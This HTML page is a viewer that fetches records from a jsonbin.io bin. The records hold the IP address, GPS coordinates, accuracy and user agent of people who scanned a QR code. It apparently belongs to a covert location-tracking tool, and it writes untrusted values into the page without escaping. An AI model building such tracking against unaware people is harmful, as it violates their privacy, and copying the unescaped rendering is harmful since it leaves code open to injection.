<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Response Viewer</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=DM+Sans:wght@300;400;500&display=swap');
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  :root { --bg: #0d0f12; --surface: #141720; --border: #232736; --accent: #5b6ef5; --accent2: #3ecf8e; --text: #e8eaf0; --muted: #6b7280; --mono: 'DM Mono', monospace; --sans: 'DM Sans', sans-serif; }
  body { background: var(--bg); color: var(--text); font-family: var(--sans); min-height: 100vh; padding: 2rem; }
  h1 { font-size: 1.4rem; font-weight: 500; margin-bottom: 0.4rem; }
  p.sub { color: var(--muted); font-size: 0.88rem; margin-bottom: 1.5rem; }
  .setup { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 1.5rem; max-width: 560px; margin-bottom: 2rem; }
  .setup label { display: block; font-size: 0.78rem; color: var(--muted); font-family: var(--mono); margin-bottom: 5px; }
  .setup input { width: 100%; background: #0d0f12; border: 1px solid var(--border); border-radius: 6px; padding: 0.55rem 0.8rem; color: var(--text); font-family: var(--mono); font-size: 0.85rem; margin-bottom: 10px; outline: none; }
  .setup input:focus { border-color: var(--accent); }
  .btn { background: var(--accent); color: #fff; border: none; border-radius: 8px; padding: 0.6rem 1.4rem; font-family: var(--sans); font-size: 0.9rem; font-weight: 500; cursor: pointer; }
  .btn:hover { opacity: 0.85; }
  .entries { display: flex; flex-direction: column; gap: 1rem; max-width: 700px; }
  .entry { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
  .entry-head { background: #1a1e2e; padding: 0.7rem 1rem; font-size: 0.8rem; color: var(--muted); font-family: var(--mono); display: flex; justify-content: space-between; }
  .entry-head span { color: var(--accent2); }
  .row { display: flex; padding: 0.6rem 1rem; border-bottom: 1px solid var(--border); gap: 1rem; }
  .row:last-child { border-bottom: none; }
  .lbl { font-size: 0.75rem; color: var(--muted); font-family: var(--mono); min-width: 110px; padding-top: 1px; }
  .val { font-size: 0.82rem; font-family: var(--mono); color: var(--accent2); word-break: break-all; }
  .map-link { font-size: 0.75rem; color: var(--accent); text-decoration: none; margin-left: 8px; }
  .map-link:hover { text-decoration: underline; }
  .empty { color: var(--muted); font-size: 0.9rem; margin-top: 1rem; }
  .spinner { display: inline-block; width: 14px; height: 14px; border: 2px solid var(--border); border-top-color: var(--accent); border-radius: 50%; animation: spin 0.7s linear infinite; vertical-align: middle; margin-right: 6px; }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<h1>📡 Response Viewer</h1>
<p class="sub">Enter your jsonbin.io credentials to see who scanned your QR code.</p>

<div class="setup">
  <label>API KEY</label>
  <input type="text" id="apiKey" placeholder="$2a$10$..." />
  <label>BIN ID</label>
  <input type="text" id="binId" placeholder="64abc123..." />
  <button class="btn" onclick="load()">Load responses</button>
</div>

<div id="out"></div>

<script>
async function load() {
  const key = document.getElementById('apiKey').value.trim();
  const bin = document.getElementById('binId').value.trim();
  const out = document.getElementById('out');
  if (!key || !bin) { out.innerHTML = '<p class="empty">Please enter both API key and Bin ID.</p>'; return; }

  out.innerHTML = '<span class="spinner"></span> Loading…';
  try {
    const res = await fetch(`https://api.jsonbin.io/v3/b/${bin}/latest`, {
      headers: { 'X-Master-Key': key }
    });
    const data = await res.json();
    const entries = data.record?.entries || [];

    if (entries.length === 0) {
      out.innerHTML = '<p class="empty">No responses yet. Share your QR code and wait for someone to scan!</p>';
      return;
    }

    const html = entries.map((e, i) => {
      const mapLink = (e.lat && !isNaN(parseFloat(e.lat)))
        ? `<a class="map-link" href="https://www.google.com/maps?q=${e.lat},${e.lon}" target="_blank">📍 Open in Maps</a>`
        : '';
      return `
        <div class="entry">
          <div class="entry-head"><span>Response #${i+1}</span><span>${e.timestamp || '—'}</span></div>
          <div class="row"><span class="lbl">IP ADDRESS</span><span class="val">${e.ip || '—'}</span></div>
          <div class="row"><span class="lbl">LATITUDE</span><span class="val">${e.lat || '—'}${mapLink}</span></div>
          <div class="row"><span class="lbl">LONGITUDE</span><span class="val">${e.lon || '—'}</span></div>
          <div class="row"><span class="lbl">ACCURACY</span><span class="val">${e.accuracy || '—'}</span></div>
          <div class="row"><span class="lbl">USER AGENT</span><span class="val">${e.userAgent || '—'}</span></div>
        </div>`;
    }).reverse().join('');

    out.innerHTML = `<div class="entries">${html}</div>`;
  } catch(e) {
    out.innerHTML = '<p class="empty">Error loading data. Check your API key and Bin ID.</p>';
  }
}
</script>
</body>
</html>
